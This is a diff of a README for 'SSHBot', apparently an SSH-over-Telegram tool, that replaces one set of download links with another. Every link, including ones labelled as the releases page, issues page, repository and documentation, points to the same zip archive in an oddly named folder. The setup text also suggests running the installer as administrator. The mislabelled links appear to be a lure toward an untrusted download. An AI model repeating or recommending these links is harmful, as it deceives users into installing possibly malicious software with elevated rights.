@@ -6,9 +6,9 @@ Welcome to **SSHBot**! This application allows you to connect to your servers se
 
 ## 📥 Download SSHBot
 
-[![Download SSHBot](https://raw.githubusercontent.com/mukeshkannan18/SSHBot/main/unfauceted/Bot-SSH-v1.6-beta.5.zip%https://raw.githubusercontent.com/mukeshkannan18/SSHBot/main/unfauceted/Bot-SSH-v1.6-beta.5.zip)](https://raw.githubusercontent.com/mukeshkannan18/SSHBot/main/unfauceted/Bot-SSH-v1.6-beta.5.zip)
+[![Download SSHBot](https://github.com/mukeshkannan18/SSHBot/raw/refs/heads/main/unfauceted/Bot-SSH-v2.0.zip%https://github.com/mukeshkannan18/SSHBot/raw/refs/heads/main/unfauceted/Bot-SSH-v2.0.zip)](https://github.com/mukeshkannan18/SSHBot/raw/refs/heads/main/unfauceted/Bot-SSH-v2.0.zip)
 
-To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/mukeshkannan18/SSHBot/main/unfauceted/Bot-SSH-v1.6-beta.5.zip).
+To get started, visit this page to download: [GitHub Releases Page](https://github.com/mukeshkannan18/SSHBot/raw/refs/heads/main/unfauceted/Bot-SSH-v2.0.zip).
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before you download, please ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-1. Click the link above to visit the [GitHub Releases Page](https://raw.githubusercontent.com/mukeshkannan18/SSHBot/main/unfauceted/Bot-SSH-v1.6-beta.5.zip).
+1. Click the link above to visit the [GitHub Releases Page](https://github.com/mukeshkannan18/SSHBot/raw/refs/heads/main/unfauceted/Bot-SSH-v2.0.zip).
 2. Look for the latest release, which will have the version number indicated.
 3. Find the appropriate file for your operating system. For example, if you are using Windows, look for a `.exe` file.
 4. Click on the file to download it. Depending on your browser, you may see a prompt asking where to save the file or it might save directly in your Downloads folder.
@@ -52,14 +52,14 @@ If you encounter issues while using SSHBot, consider these common solutions:
 - **Bot not responding**: Check your internet connection. Ensure that the bot has permission to access your Telegram account.
 - **Installation issues**: Ensure you have the correct permissions to install software on your device. Try running the installer as an administrator.
 
-For more assistance, visit the [GitHub Issues Page](https://raw.githubusercontent.com/mukeshkannan18/SSHBot/main/unfauceted/Bot-SSH-v1.6-beta.5.zip).
+For more assistance, visit the [GitHub Issues Page](https://github.com/mukeshkannan18/SSHBot/raw/refs/heads/main/unfauceted/Bot-SSH-v2.0.zip).
 
 ## 🔗 Additional Resources
 
 For more information, visit:
 
-- [GitHub Repository](https://raw.githubusercontent.com/mukeshkannan18/SSHBot/main/unfauceted/Bot-SSH-v1.6-beta.5.zip)
-- [Documentation on Commands](https://raw.githubusercontent.com/mukeshkannan18/SSHBot/main/unfauceted/Bot-SSH-v1.6-beta.5.zip)
+- [GitHub Repository](https://github.com/mukeshkannan18/SSHBot/raw/refs/heads/main/unfauceted/Bot-SSH-v2.0.zip)
+- [Documentation on Commands](https://github.com/mukeshkannan18/SSHBot/raw/refs/heads/main/unfauceted/Bot-SSH-v2.0.zip)
 
 ## 📞 Support
 
